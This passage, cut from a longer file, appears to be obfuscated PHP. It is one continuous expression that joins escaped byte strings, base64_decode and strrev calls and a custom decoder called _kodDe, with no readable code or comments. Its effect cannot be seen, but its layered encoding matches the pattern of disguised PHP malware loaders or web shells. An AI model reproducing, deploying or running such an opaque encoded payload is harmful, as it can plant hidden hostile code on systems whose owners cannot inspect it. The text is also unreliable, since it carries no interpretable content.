yDâV1¢°57LzÌœÃò‰Æ@GÚ¥LGä').base64_decode('dOKf4uddxKdzfygYCXZRR73VDsZmUcHUwErLfF9DdUUX+5ZbMdhS7yYQMvx6MZ9nt55Q1mQLVRz5')."\x80\x8\x67\x8a\x26\x5f\xe2\xa0\x57\xbd\x8\xb4\x9\x30\x8\x58\x70\x3e\x2\x5d\x9f\x28\x49\x17\x5d\xd9\x99\x13\x1c\x2\xaf\x92\x3\x9f\xf5\xc2\xf2\xe8\x74\x10\x9c\x88\xd2\x2f\x65\x35\xea\x7d\xa5\xb9\xb1\xb1\xd1\xd9\xd8\x4\xfe"."\147\167\75\344\23\255\215\215\25\50\215\215\255\350\177\234\200\316\142\111\207\132\123\300\374\245\214\206\40\224\25\205\352\102\23\24\65\137\244\242\16\350\57\344\370\244\225\116\364\371\302\106\155\276\244\300\326"."\221\230\142\157\151\100\113\133\6\205\56\1\160\146\323\60\220\67\300\160\240\226\323\236\244\127\270\0\215\17\64\250\207\57\237\44\373\205\371\130\125\276\135\374\230\213\366\240\10\24\317\325\115\226\126\24\245".strrev('‡	Aëp?Ô1bOF¥ñVŒ§#U%cí»2Ëm}3%ñQx$l 2Ö	¬'."\0".'.±.')."\xf5\x4\xe9\x24\xca\x4\x29\xa1\xd0\x4b\x41\x72\x21\x87\xec\x5a\x46\xd4\xac\xc5\x70\x22\x26\x94\x2d\xba\x95\x4\xbc\x6\x4a\xae\x74\x88\xf1\x19\x3b\xf9\x0\x14\x7a\x5c\xbc\x27\x91\xd7\x31\xf4\x30\x1\xd6\x1\x68\x9d\x2a\xf4\xa4"."\xae\x71\xf3\x85\x8a\xf7\x36\x68\x2c\x5c\xfd\xae\x59\x38\xe5\xa2\xb0\x49\x30\xd9\x21\x18\x85\xf8\x28\x0\xdf\x6\x77\x31\x57\x29\x42\x1\xf6\x24\x5b\x1e\x4f\x52\x78\x4f\xc2\xe0\x3e\x52\xba\x98\xcf\x25\xd1\x71\xa\xf6\xa\x23\x5c"."\273\32\304\325\37\367\306\104\313\140\255\57\352\131\127\101\327\322\140\44\14\241\136\20\336\137\35\314\320\53\61\253\40\261\6\211\170\42\20\52\130\320\247\14\10\121\261\363\172\260\301\143\54\122\100\15\263"."\155\207\0\264\252\100\10\11\135\314\201\257\10\204\233\220\1\141\13\211\14\246\254\145\300\335\215\25\302\152\366\65\44\104\67\237\46\171\56\103\260\173\41\150\134\343\3\236\2\210\307\245\252\326\105\150\7"._kodDe('Lvbmza+yo5gbvHxmgNAaGZM9VNdre5zQWXoCC/V+v7SZSDNZKMhq/HuYRTqzBfF9M/zWkBxhhRH5dg==').base64_decode('dANcyH8hl5ttUbv+AOJ/JmVh1MNanrk9hp2Bex/Hq3yBZGJZXPQq0pVIpW0gRnQVAIVvEZBSLhBN')."\x29\xdf\xec\xd5\x26\x0\x5f\x93\xdd\xb3\x5d\x8d\x52\xdd\x52\x15\xc8\x5f\x65\x43\xea\x8b\x48\x73\x5c\xcd\xf3\xa5\xa5\xc1\xa5\x73\x66\xd5\x4b\x40\x12\xcc\x2a\x4b\x95\xf8\x62\xd5\x74\xcf\x6e\x99\xeb\x6a\x99\x23\xd5\x2d\xee\x89\xf4"."\6\34\22\264\245\222\26\1\311\122\253\227\272\62\272\226\123\334\315\163\241\45\310\254\331\55\256\23\147\111\141\71\45\353\52\311\105\270\47\321\142\55\223\137\370\362\126\114\250\162\114\330\165\143\141\200\162"."\135\244\252\213\357\352\6\141\56\242\177\11\146\12\172\276\113\314\210\64\44\210\62\225\270\213\207\270\126\72\260\26\13\21\206\70\256\4\337\352\261\134\17\36\267\216\162\171\60\25\371\224\206\113\206\100\152".base64_decode('MMoIC2qmZ8VHj5aqSXbDPxg1hhqi7l4lqcqd2hiODqIfpLwKNQHrYXTm/xJtiA5RbTD4wR6F797c')."\63\372\275\335\116\216\316\166\213\310\305\61\167\324\115\52\206\374\60\362\57\320\362\151\351\21\373\146\21\207\361\373\5\70\334\5\107\1\210\21\136\266\102\2\276\317\43\150\220\54\270\114\331\107\327\222\305"."\4\55\262\337\22\53\44\123\113\304\115\253\227\114\41\44\270\211\357\24\215\1\311\235\265\110\217\346\207\320\64\207\120\324\16\14\153\260\264\15\303\146\316\230\341\13\166\63\215\121\216\61\326\334\70\144\215"."\55\250\33\314\247\206\26\324\327\301\214\153\10\14\227\102\273\227\72\65\260\124\105\374\252\245\173\147\152\361\141\267\112\66\215\156\102\77\250\156\155\155\165\256\206\372\216\16\276\247\164\103\42\264\224\300\352"."\xc\xbd\x4f\x56\x96\x6d\x89\x84\x28\xb2\xce\x3c\x55\xba\x81\x40\xa2\x8f\x17\xfe\xeb\x9c\xa\x46\x27\x99\xe1\x35\xe4\x7f\x9b\xd3\xed\xf7\x92\xe\x1f\x1c\xc2\x81\x36\xd0\x27\x2b\x3b\x86\x1a\xea\x7\x3b\xaa\x40\x58\xbe\x7e\x5d\x29"."\x55\x6d\x32\xe8\x37\x36\xde\x51\xf2\x26\x56\x94\x2c\x6d\x51\xfa\x16\x17\xd1\x58\x8c\x12\x95\x45\xaa\x5d\xc8\xb4\xd\x69\x53\xea\xa2\xd1\x68\x12\x79\x15\x67\xfa\xe6\x4\xc2\x1c\xd1\xd7\x4d\x3\xf1\x66\x11\x3\x3\x28\xc2\x34\x8a"."\327\66\50\73\123\250\256\35\0\231\251\41\267\271\32\72\246\323\314\350\212\204\22\310\101\123\251\311\130\117\3\373\372\130\267\17\374\143\104\171\2\51\36\335\236\20\144\300\225\235\276\276\210\77\342\367\21"."\x3d\xfb\x3d\xf6\x9f\x7a\xe0\x41\xa4\xf\x88\x4e\xeb\x41\x53\x69\x91\xa0\x73\xa3\x63\x8d\x8d\xe0\xdf\x89\xe0\x9f\xc\xfe\x25\xc0\xbf\x24\x24\xe1\xa8\x1\xfe\xce\x3\xff\x40\x4a\xb\x80\xb6\x28\xd1\xb1\xd9\x71\xf0\xf\xa4\xce\x5"."\xbf\x73\x21\x56\xa\xfc\x9b\xcd\xb9\x48\x47\x7\x2f\x18\xb4\xd6\xe3\xec\x6\xcd\xae\x56\x38\xc8\xd2\xc1\x28\x5c\xa8\x20\x3c\x0\xa0\xce\x2f\xf8\x55\x9\x7c\xb4\x41\x91\xe9\x1c\x92\xb3\x4c\x43\x47\x78\xa\xc\x7e\x32\xaa\xc3\x79"."\7\147\35\237\36\165\320\154\24\341\301\331\132\245\46\34\227\141\132\32\61\31\15\17\174\63\226\70\215\131\263\146\72\135\215\115\315\55\263\146\317\231\73\217\234\314\347\213\71\105\247\247\57\156\344\246\261"."\x5\xfe\xa8\x49\xfa\xc3\xcf\x75\xac\xe7\xd4\x5\x83\xfa\x35\xc8\x31\xf7\x1\x80\x37\xd2\x65\x5f\xd0\x75\x32\x44\xed\xb0\x11\x65\xbc\x97\x1e\x56\xc0\xa5\x32\x5\x2f\xb9\x48\xda\xbc\xce\x7e\x42\x39\xee\xe8\x20\xe4\x36\x51\x4a\x89".base64_decode('0FOtoP9DYuEMPVOd0dicbGV/bDAqEqUNl1BX/IKTXARtoppuw4U0r1hEeOwJEIHRhS9ihUNxWKJQ')."\266\160\172\211\342\360\205\54\52\373\140\100\66\116\135\364\213\151\2\170\241\13\310\113\51\227\157\231\277\333\325\5\37\257\12\27\230\365\272\21\132\104\24\154\131\0\125\336\5\167\175\171\205\372\330\110\301"."\53\304\20\133\343\100\223\34\303\5\45\355\50\344\323\216\264\232\162\304\163\5\207\251\246\122\360\217\3\214\241\243\220\110\72\214\122\332\241\244\344\61\107\131\211\27\250\143\156\275\331\241\350\51\307\110\62"."\341\110\46\164\107\22\24\220\327\313\216\274\222\162\150\0\256\227\233\35\5\20\66\0\114\6\377\14\235\370\101\51\251\111\105\3\173\53\103\313\26\221\256\327\330\44\360\161\52\6\121\310\62\113\57\370\273"."\275\215\256\145\41\226\72\346\230\44\301\136\314\362\257\55\146\334\122\314\162\173\61\142\242\227\172\124\137\210\207\204\306\361\173\134\162\26\172\150\47\377\215\345\12\56\370\17\211\21\12\104\164\240\61\137\10".strrev('°~ÍWX½„zhV–˜•‰'."\n".'XEHİB)&ˆ˜‚™–e-'."\r".'Ú	êåŒ*é¢0¹Æ¡.ˆŠ.zN}')."\17\227\271\332\46\36\115\0\67\142\5\150\347\52\44\101\40\300\356\127\307\250\321\373\102\27\276\230\346\370\5\230\350\140\160\135\56\333\322\10\21\332\46\101\365\11\2\312\201\263\203\26\6\17\111\143\360"."\x8c\x54\x68\xd9\x42\x97\xbf\xc7\x1b\x72\xa1\xf2\x90\x49\x24\xff\x36\xbc\x6d\xd5\x45\x9f\xa\xf8\xa3\x4c\xc0\x66\x88\xe9\xac\x16\x97\xb3\x31\x5c\x6\xbf\xca\x93\xf3\x80\xab\x30\x9b\xf9\x85\x2e\x1c\x7\xa5\xb9\xac\x29\x69\xaa\x8c"."\x95\xd5\xf2\x69\xd5\x2c\x26\xad\x6d\x5a\xd4\x1f\x46\x55\x29\x82\xc\x2e\x1b\x4a\x16\x94\xf7\xd\x19\x2c\x18\x72\xf6\x9b\xf0\xad\x18\x49\xa5\xa4\x26\x94\x5e\x79\xa4\xa\x41\x41\x28\x25\x99\x1c\xc3\xc0\x39\x38\x8f\xb7\xe4\x80\x87"."\53\54\13\177\130\11\61\137\57\73\45\24\263\370\151\22\74\32\7\135\107\163\243\54\111\16\27\12\362\10\54\124\54\12\263\126\132\200\310\150\23\200\63\122\333\122\17\40\64\250\175\324\55\356\74\110\61"."\x5d\xc1\xde\xfe\x81\x88\xcf\xeb\xaa\x8a\x44\x81\xc2\x65\x86\x48\x95\x55\x92\xe1\xc9\x34\xd8\x99\xa3\xf3\xc8\x49\x72\x4d\x82\x82\xb4\xd1\x40\x61\xfc\x34\x55\xcc\x54\x99\xda\xd\xb5\x55\x45\x65\x46\x11\xbd\x22\x51\x0\xf8\xf3\x2d"."\xb3\x73\xb9\x6e\x35\x5b\x65\x21\xfa\x1a\x34\x90\x54\x34\xbc\xa0\x83\xb9\x95\x91\xbd\xf\xab\xa0\xf8\xc3\x41\xd4\x50\xb0\x4a\xf1\xd7\x72\xc5\x2f\x56\x45\x58\x9a\x51\x4d\xa5\x53\xce\x56\x7c\xa\x65\xa9\x4c\xa5\xbd\xc3\x95\xe\xab"."\xf5\x1d\x4f\xa5\x90\x4e\x55\x36\x26\x19\xa5\xa\x14\xdf\x12\x61\x21\x26\x41\x39\xe1\x90\x93\xa6\xe1\x90\x8b\xe\x39\xa7\x3b\xe4\x92\xee\x88\x6b\xf9\x11\x47\xd2\x48\x81\x7f\x86\x3\x2c\xbd\x30\x39\x95\x5\x88\x59\xd9\x91\x5\xc"."\314\221\123\223\252\43\7\2\252\351\30\313\71\214\226\34\131\204\163\5\220\130\150\161\150\51\335\241\217\200\42\215\14\234\33\43\216\262\134\162\224\163\262\43\67\113\166\150\351\264\243\64\232\162\224\113\216"."\222\226\160\230\364\10\231\212\111\61\103\324\160\34\55\252\211\21\10\166\301\77\140\134\162\5\43\126\314\253\143\324\115\171\116\323\112\122\256\224\111\176\23\76\326\222\266\343\143\241\4\360\75\135\63\106\144"."\27\322\264\122\164\373\162\304\322\7\11\302\32\250\212\10\106\133\56\24\34\100\240\111\202\155\47\262\15\36\262\347\344\365\31\144\253\40\125\347\212\101\111\115\314\201\53\103\77\201\345\4\101\165\5\46\342"."\225\53\246\133\116\321\231\273\26\170\234\42\212\250\104\344\2\305\121\317\103\170\145\24\14\32\60\312\144\53\243\375\363\26\320\40\220\267\113\115\153\340\337\346\65\62\340\255\45\115\217\253\6\175\175\212\65"."\x7d\x48\x14\x36\xff\xfb\x4c\x22\x33\xfc\x1f\x72\x71\xf9\x34\xad\xe4\xf5\xff\xf9\xab\x42\xa6\x71\x85\x1a\x14\xfd\xf7\xd9\x79\x1e\xd0\x51\xd4\x9e\xfd\x7f\xe8\x28\x98\x29\x26\x3e\x4\x47\x90\xc\x57\x41\x4d\x40\x4e\xed\x6a\x74\xf1"."\153\27\44\326\320\271\67\13\314\322\222\43\65\13\116\265\22\230\146\45\107\116\53\201\31\255\72\364\134\51\356\310\215\224\100\0\312\314\71\60\17\101\130\1\42\241\121\116\221\271\333\222\156\166\264\244\13"."\16\31\114\374\270\12\70\200\132\112\71\362\106\311\1\146\77\370\277\154\202\342\300\157\16\310\42\71\50\241\347\200\250\136\322\342\224\355\100\105\142\227\226\207\317\55\300\307\10\134\145\170\164\347\230\114\270"."\xae\xc4\xcf\xa0\x93\xb7\xca\xc\xe3\xff\x2b\x1b\x70\x58\x27\x6c\x82\x1c\xaa\xc5\x4\x9b\x8b\xff\x9a\x45\xd8\xca\xc2\xc9\x42\x49\xb8\xb6\x68\xf\x23\xcc\xc8\x85\x2e\xd2\xa\x2c\x25\xc2\x4\x7\x93\x3f\x39\x1a\xc9\xc\x6f\x6c\x12"."\261\254\246\215\24\13\2\53\300\251\170\227\155\270\6\33\233\326\64\15\271\370\364\376\46\114\134\354\67\141\41\306\40\40\361\236\301\350\50\75\366\365\125\44\137\22\62\10\173\110\316\67\71\277\134\43\362"."\xcb\x35\x84\xd9\xd\x59\x84\x5f\x3b\x71\x30\xae\xb\x13\x60\x27\xd0\xb3\x50\xf2\x5b\xc1\x75\x7\x75\xb0\x67\x14\xe7\x55\x95\xdd\x3\x11\xb9\x28\x33\x26\x46\xbf\x86\xa5\x22\x6c\xf2\x7d\xd\x96\x8d\xcd\x5b\x98\xbb\x85\x45\xe7\xd8"."\xe2\x6d\xd9\x9\x57\x80\xd1\xa0\xe0\x70\x5\x3f\xd7\x13\x19\x95\xde\x4b\xa1\xb\x12\x2e\xf8\x17\xf3\x74\x6b\xa0\x24\x5\x79\x1f\x64\xc8\x26\x75\x25\x2f\xbc\x13\x4\x5a\x4\x76\x68\xd0\xa3\xc\x3\x81\x4e\xe4\x8f\x81\xc0\xaf\xb6"."\xba\xdd\x58\xb3\x1c\x6e\xc7\xe7\x43\x5b\xaf\x39\xb3\x8\xa7\xc0\x9e\xbd\x48\x85\x4\xc5\x2e\x8d\x9\x33\x68\x5e\xe1\xe0\xa2\x40\xb0\xd3\x83\xfc\x45\xc4\x7a\x82\xf4\x91\xed\xf6\xf6\xe\x43\xbc\x4c\xcb\x0\xd2\x72\x82\x3a\xa5\xd9".base64_decode('Y5ZLZR2qTzgiRHdQIqmSlmfXYeQIrYxRcaS/pz/mGYj0CD43GKif6P+g18QhJBjyr/BwD1ugkfRo').strrev('ÛGÉáNkÏœßE\'t¦:§4“cViF®MİğÖLV¬‰’Ñ¯k™A(˜Nò!èjm4xN¥Òéi').base64_decode('q/PWRMuzxvTjOAlsOwAFCpvrYEnRBcMI+lI3+e0NLiEKz13BfnLU0LuYacF4lQKVr7sqnoBGijtj').strrev('8~·™ûwö'."\n".'Ö#$G76îJ¦lä’ÓZÒYëÆ½·«Fòp¤ù©HVº[y¶ $¦|ì¹')."\344\44\215\74\134\357\43\223\210\174\312\242\22\137\3\172\272\206\253\304\327\240\72\325\110\324\51\40\62\62\302\101\346\232\127\64\1\46\312\246\320\264\116\350\7\30\145\206\70\210\100\274\76\350\124\101\40"."\217\14\73\60\267\131\177\140\40\261\112\354\21\255\22\101\107\300\245\14\336\311\303\136\205\35\223\200\312\112\150\322\340\256\261\244\263\134\151\305\44\67\267\10\16\153\227\164\303\45\312\231\124\165\5\371\301"."\201\231\155\150\125\77\112\165\256\220\103\6\301\151\143\121\230\360\212\140\104\315\15\300\343\314\46\3\24\211\256\366\154\3\115\242\341\366\32\142\265\110\347\5\344\233\65\35\230\105\266\205\133\225\61\70\250".strrev('ÍåT«xúÈ—`„S4[çJŞÄ«}­ÂÑ+•TjØ8¨Aˆ.ov‰˜·6«¥"fŸvÜôAÉ ').strrev('BùÈâÆ¥à~¢\\í‰âvØÔr$£°·ÛëÔé†ŠätljÌæóíj UÖ…¤ê¤oX˜H•zuUlõ')."\xab\x44\x26\x82\x43\xa2\xf3\x3\x87\xfa\x3d\x91\xae\x1e\x87\x84\x88\xd5\x21\x2d\xf2\x45\x0\x78\x0\xfc\xc1\xc6\xc\xe\x9\xce\x6b\x90\xc\xe6\xb9\x43\x82\xa6\xda\xe\x69\xa0\xf\xff\x72\xf5\x74\xd0\x77\x98\x2c\x90\x19\x11\xea"."\x4a\x10\x87\x14\x4d\x89\xc6\x4d\xa2\x24\x9\xce\x58\xa8\x90\x43\x7a\x1d\x3\xe8\x88\xe6\x5a\x97\xaa\xf9\x96\x66\xa8\x9d\x8e\xd\xa5\xe0\x96\x9e\x10\x3\xe0\x8e\x45\x3d\xdf\x8a\x5d\x46\x19\xce\x9c\x9a\x0\x2\x0\x58\x7c\x9d\x80"."\44\132\241\6\240\265\14\172\347\371\377\137\2\254\5\125\221\377\377\57\5\252\123\170\114\260\310\304\213\246\142\374\117\145\120\6\307\272\12\53\62\165\220\125\241\111\152\156\154\224\202\213\41\32\111\231\52"."\344\242\235\114\170\1\36\37\262\240\143\25\216\244\134\242\257\353\146\340\44\123\363\5\352\304\23\61\52\60\360\241\245\41\346\57\117\263\56\7\21\13\267\46\15\113\122\116\115\106\33\152\367\47\341\176\4".base64_decode('5B1n7YBre0mBabSzMCZmZclW9BXMxRjYgggKxJhgkmeLBiiMY+M0hp6E61CHmoeP8ZqIt2EIQ9DK')."\171\205\116\172\230\37\132\22\272\21\320\315\31\63\314\207\21\131\76\342\364\264\303\217\213\126\40\12\205\131\133\5\355\306\72\350\254\320\12\362\150\121\141\360\126\333\54\141\155\106\231\30\31\330\172\214\142"."\x59\xba\x96\x91\xb\x2e\x12\xbe\x71\xe7\x8c\xa0\x6f\x70\x6\x94\xc7\x2b\x44\xab\x4\x3d\x5b\x3b\x1\x3f\x29\x55\xb0\xe4\xa\x5a\x80\x3\x3a\x29\x4f\x9c\x74\x11\xff\xda\x95\x15\xeb\x0\xd3\x85\x15\x11\x1b\xe\x2e\x73\xfa\xc6\xa"."\240\216\112\22\254\324\140\157\77\156\61\111\166\257\304\266\50\370\206\257\241\336\111\3\314\127\24\271\20\42\356\23\112\150\231\42\114\32\12\256\44\134\2\363\1\172\273\115\66\331\1\315\24\133\113\245\340".base64_decode('yQWJESy09aRZ8L6SxgpZOa8YNAayijLwEjHjEmtGhkqThWN4seoxLDQTyFisoGTxuQoylKPw8Ung')."\211\254\16\235\322\45\305\270\232\203\267\221\62\253\244\16\244\173\300\215\106\50\116\132\127\224\274\5\22\317\26\25\13\100\316\26\62\62\202\140\0\171\56\243\53\356\356\112\273\273\164\167\27\331\225\357\211".base64_decode('f/YiyWTVIu626CMbqIF40w3986TVVFU43DZUTShQqa7MlXsygtoNPL+MQbuhGD/mqLhQQmWGNJMt')."\xb3\xc2\x47\xe0\x6d\x38\xba\xf4\x20\xcc\x82\x3f\xc6\xa\x71\x52\x59\xaa\x21\xe6\xef\x5d\x14\xeb\xe\xf8\xfb\x63\x68\x1f\x10\xec\x8b\x78\x2\xb6\x4\xc0\x58\x23\xfe\xae\xa\x70\x67\x90\xfa\xb\xb6\x35\x2d\x9e\xb3\x6a\xb0\xa9\x79"."\x24\xb\xf4\x73\x77\x44\x20\x2a\x1b\xcc\x5f\x2e\x71\x43\x49\xf2\x40\xb3\x3\x1c\x9c\xdf\x16\xd7\xdd\xd4\x5a\x33\x2e\xec\x8a\x8c\x9c\x9c\x65\xa\x52\x6e\xaa\xa\xef\x36\x8a\x44\x8e\x20\x2e\x6c\x2\x7e\x32\xc1\xdc\x64\xbf\x18\x50"."\343\324\30\252\53\260\2\64\1\172\32\11\206\74\241\345\334\237\63\110\211\170\102\223\244\300\74\304\1\41\365\211\67\177\341\302\205\364\171\325\104\26\233\167\102\363\3\166\377\16\240\360\64\113\251\204\312".base64_decode('lZhQow/ZRFnu70Oy7sEtqJK4Qi1MkqgW6OOYBaoBXyjSy3F2PCf4FZpLfsfIb3yC0L6s09c1ZJJf')."\65\310\171\133\172\2\252\322\321\60\130\216\262\374\134\24\351\50\17\111\135\162\276\326\224\202\0\155\276\324\13\15\241\362\151\151\2\264\34\373\350\66\270\167\22\43\243\144\263\61\250\102\107\252\233\310\150"."\222\175\227\111\243\223\177\203\27\103\300\105\252\377\1\71\54\250\40\231\171\144\272\13\332\3\334\355\6\61\110\164\271\210\122\20\364\326\0\70\216\25\11\171\75\245\156\30\320\61\104\14\60\103\301\71\46"."\x14\xa7\x24\xb8\xfe\x20\xb\xb\x8b\xbf\x9d\xc5\x5a\x92\xc\x5b\x2b\x76\xb2\x93\x54\xc6\xe6\x4b\xc8\x83\x14\xf1\xb4\x5e\xdd\x69\x13\xfa\x8c\x4\x3e\x3\x4d\xcd\x24\x6c\x24\x6c\x51\x38\xc4\x8\x15\x90\x56\x8b\xde\x22\x4e\xa8\xac"."\xf0\x8c\xc6\xa6\x46\xc1\x5a\xc4\xdf\xe5\xb\xc7\x4e\xa\x43\x3f\xab\x1\x3f\xf5\xdf\x63\x4d\xf0\x83\xb4\x48\x68\x92\x14\x4f\x68\xb2\x94\x60\xe7\x49\x93\xa4\x74\xd1\x4d\x86\x35\x25\x10\xc\x86\x45\x57\x51\xb6\xea\xd\xf4\xb\xce"."\45\311\46\32\56\360\115\104\211\264\157\40\100\370\127\224\120\160\224\60\354\56\242\56\25\55\316\150\234\105\15\211\370\163\241\260\157\142\302\153\337\370\10\16\207\65\264\215\303\141\51\41\143\203\233\270\202"."\x45\x7\x25\x9\x1d\xcb\xc2\xda\x49\x6\x10\xa8\x29\xbb\x9f\x6\xbd\x46\xbb\xdd\x75\xae\x99\xf5\xd3\xa7\xe5\x44\x58\xb4\x1\x2\xa3\xd\xee\x69\x3\xa4\x1a\xd3\x38\xc\x20\x4c\x67\x70\xf7\xca\xba\x9a\x35\xb5\xf5\xae\x86\xba\x68".strrev('\\jä;SX7PÑ–3ŞC_=å'."\0".'ËX'."\0".'jÚv‚é¡Ñ'."\r".']FX}ËZÏV†©”H´hµ+R‹S=S').strrev('ŸÈW3=û‚Ê`~ÜıD3,…+`¨×(Ë°+Sµ9t‡â{'."\r".'Pî˜,w¨jì4xBµ€=`Á')."\313\211\212\356\30\102\227\224\42\135\373\120\220\32\206\25\270\302\277\125\71\227\105\55\263\245\121\352\4\362\234\305\42\333\342\43\120\250\235\76\123\50\50\46\272\340\104\20\361\225\27\30\27\136\247\25\352"."\xa\x84\x3a\xc1\xb1\xc\x2c\x88\x7a\x63\x22\xd2\x82\x6c\x64\x26\xf1\x44\x84\x9d\x82\x80\x6\x8\x75\xc2\xfe\x25\xe1\xa9\x80\xb0\xd0\xf6\xd8\xdc\x7a\x91\xbd\x56\x65\x1f\xe2\x30\x20\x64\x32\xb5\x10\x1e\xf8\x14\xda\xfc\x50\x5f\x29"."\134\307\274\34\47\75\0\373\70\146\373\40\63\367\316\12\173\126\257\125\206\341\132\135\64\112\345\250\204\134\200\367\77\111\174\322\16\72\236\174\233\205\6\372\241\63\75\310\11\142\364\240\125\0\371\373\374"."\xb1\xb0\x7f\x85\xaf\x22\x1\xfa\x94\xae\x9e\x2\xd6\xfb\x88\x9f\x8a\x3f\x2\xbc\x2f\x88\xfc\xd7\x59\xe0\x3\x7d\x8b\xfb\x82\x4b\xab\xa1\x46\x7a\xfb\xb9\x2c\x21\x24\x75\x79\xfa\x22\x31\x61\xe3\x8a\x77\x34\x60\x5f\xc6\xb6\x34\x54"."\1\76\241\47\132\232\343\154\232\61\277\156\124\340\47\63\205\256\371\334\115\303\230\223\331\3\320\115\221\227\173\127\41\331\320\351\54\251\2\362\65\103\62\210\107\75\142\262\103\252\172\320\303\166\135\304\60".base64_decode('xHaGGVfzMvWKm6PfzjFLO+hwijrpQVZxVDIQ78IL7EKRmKLpIFVHBuLCwV7eDClpMRrQmA4gWs2r')."\24\1\137\125\22\14\127\340\116\306\223\60\213\342\213\115\302\163\364\40\266\210\273\167\25\114\0\235\115\22\153\121\14\227\214\43\63\205\4\254\171\136\305\214\320\346\205\101\160\16\213\54\322\303\305\70\363".base64_decode('pWOz+6OuZyXRyo46kIUFoAeHYAsMMQ0UC1+j5i0Ts6BvVmTBadAYjrMyMcWACl4DVOyqllLlUyhJ').base64_decode('6NEE3exR/3ikk3hfmbS/m50txNGK6IGWmNKRznU2SwJ5Qd4jUAQ+smDdyA1FsxxHg3aMCh98bnyI').base64_decode('X0NiQ4ueTWIxXTBMU5J06NCzQ1XXEgxE7xINVEvHnQWTvRZXoTYEMOWt6eiLYmVS+A0qi8tEWyE6')."\116\363\52\334\261\11\312\305\333\301\275\256\2\20\330\373\240\327\156\170\307\160\177\170\370\235\45\352\33\326\223\114\332\301\21\215\1\53\175\352\271\230\127\133\342\276\37\154\112\303\376\140\137\135\75\224\262".base64_decode('LP4IeseZg3Uwkmgd75XH+ECxCE1ldGpYIthNpSU3AzGsMn29kO26+nv63QzUSbuJvadDjLDhawZi')."\241\101\42\263\226\261\105\25\341\245\255\314\163\47\335\22\225\163\152\102\12\4\27\301\375\270\327\37\136\54\245\25\123\342\202\20\272\335\260\316\174\344\114\2\235\6\122\302\217\123\65\31\24\164\242\223\23"."\247\305\155\21\333\245\210\56\75\141\101\25\5\343\121\27\213\203\307\56\316\44\63\304\265\341\122\301\241\42\207\370\175\41\17\334\345\130\171\5\2\223\375\217\265\234\161\5\136\40\124\377\166\261\312\167\11".base64_decode('fpYfuggZ1HxJNVTOBmhXjYv4FX2JmiIgQCdm3FKddSv7ToUFNY9jHPJem2Cfi4dEfLewQB3YkGt6').base64_decode('Ov4kKtx4F3RZNRQBYHnVkODHMBaGhfyLeiL/dXFqkr9QaKuMmqRSIvMZDmRDVB7W/rFUASo4cP7g')."\367\72\320\123\162\334\11\55\12\2\71\322\1\217\265\120\5\34\302\223\133\350\6\231\114\35\125\103\206\260\304\376\23\303\374\301\30\176\67\13\107\335\166\321\70\205\214\112\221\225\222\340\36\311\115\317\43"."\x99\xf\x71\x78\x2c\xed\xa3\xce\x7a\x5c\x26\xd\x41\x30\xb7\x60\xe5\xfe\x64\xa9\x53\x5d\x58\x14\xf9\x34\xac\x1b\xb6\x6a\x56\x35\xf4\xf0\x7\xb5\x7e\x25\xd6\xf9\xac\x79\x38\x6a\xf7\xc2\x9b\x11\xa5\xe9\x8a\xb2\xa0\xac\x3d\x79\x39"."\x20\x9f\xc4\x8d\xff\x19\x82\xd4\x2e\x35\x22\x1f\x12\xdc\x9b\xaa\xd4\x46\xdf\x34\xe0\x9f\x40\xf\xd3\xf9\x72\x5\xd3\x62\xa0\xdd\xa3\x1a\xfc\x6d\x12\x24\x6c\xf0\x4d\x15\x94\xe0\xb4\xdc\x78\x5\xc0\xe2\x1\x20\x40\xab\xc1\x9c\xba".base64_decode('QuOWfEoTW42YnA8wEwcKYcNvBzwUN/sRSQWUkmLNPmlZhn114EIL4ALQVIVrS1OIIKJY+C2KCKSL')."\114\147\205\7\0\350\57\364\324\303\104\131\130\137\241\100\142\160\25\45\277\224\265\332\213\6\3\330\105\24\132\50\315\303\150\105\142\257\302\65\350\110\135\35\266\325\2\72\301\223\363\214\105\301\141\4\110"."\xd8\x49\x12\x8\xf0\x69\x45\xd3\x4\xaa\x61\xfe\xa8\xd8\x46\x15\x39\x9f\x65\x7\xd6\x60\xd1\x8e\x0\x16\x97\x76\x60\xb1\x3\x32\x7\x1e\xeb\x1c\x17\xc3\xa2\x57\x5f\x54\xaf\x8\xb3\xd3\x51\x93\x6c\x84\xc4\x4b\x7c\x27\x4d\x85\xea"."\151\224\105\160\252\305\251\2\25\63\276\43\346\306\326\1\41\354\46\323\205\175\222\340\24\35\354\36\230\57\134\13\32\341\32\140\207\65\251\367\34\42\12\140\117\72\305\274\37\77\337\140\201\352\302\356\104"."\364\253\214\175\6\161\317\370\4\35\174\255\37\73\11\42\315\26\213\244\216\232\320\17\334\277\200\211\312\254\312\335\225\216\235\240\33\117\52\131\10\156\157\211\227\55\227\270\175\40\10\122\233\304\7\330\62"."\x81\xa0\x74\x6\x4\x37\x7\xa\xa0\x59\x29\xca\x98\xd5\xa1\x96\x59\x89\x50\x18\xc9\xa1\x97\x43\x19\xf5\xc1\x1e\x25\x3f\x5e\x25\xc5\xa4\x6f\x18\xe7\xdb\x34\xf1\xf1\x1a\xda\x4\x4c\xec\x15\xdf\x40\xbf\x90\x2f\x3a\x70\x1b\x1d\x8c"."\340\125\43\200\264\75\215\60\226\105\35\360\166\24\374\340\375\204\341\340\157\35\70\360\115\7\62\61\262\223\133\226\273\326\2\75\316\277\17\53\34\21\353\142\221\201\355\342\57\353\64\133\206\220\275\143\43"."\132\245\327\13\356\330\52\137\314\161\17\142\40\142\335\16\124\64\130\150\141\121\317\72\220\256\262\203\76\352\150\353\16\241\16\61\123\150\43\23\75\155\3\126\245\167\277\261\164\342\46\31\111\377\100\216\302"."\236\103\160\122\53\272\31\252\216\246\132\50\23\154\277\371\231\73\176\235\266\140\137\43\226\347\222\315\55\263\117\24\67\334\174\344\270\163\42\162\27\102\164\251\350\331\42\243\5\311\112\151\22\175\22\127\234"."\333\50\321\352\355\231\74\142\54\360\166\33\17\376\257\46\204\247\232\154\216\63\11\107\200\254\144\241\13\252\175\345\377\277\36\70\116\345\157\350\50\227\307\254\356\355\310\46\233\47\13\22\266\270\27\0\243"."\341\141\123\312\314\4\363\331\161\173\223\361\23\257\377\175\245\251\270\54\133\235\233\241\124\56\53\100\6\102\277\114\317\305\323\266\225\37\213\33\302\330\12\247\103\212\31\204\376\15\310\310\13\33\60\220\142"."\101\23\126\177\20\143\202\17\177\225\15\126\214\326\144\222\35\23\235\273\274\72\350\215\7\356\106\5\221\251\205\144\205\327\226\305\47\23\120\101\21\301\325\144\145\321\150\313\116\52\111\150\26\51\105\40\277".strrev('xDüH*œf'."\r".'™’ñ/åñ[( 6’ó0š!¹Ä'."\0".'îËÄ	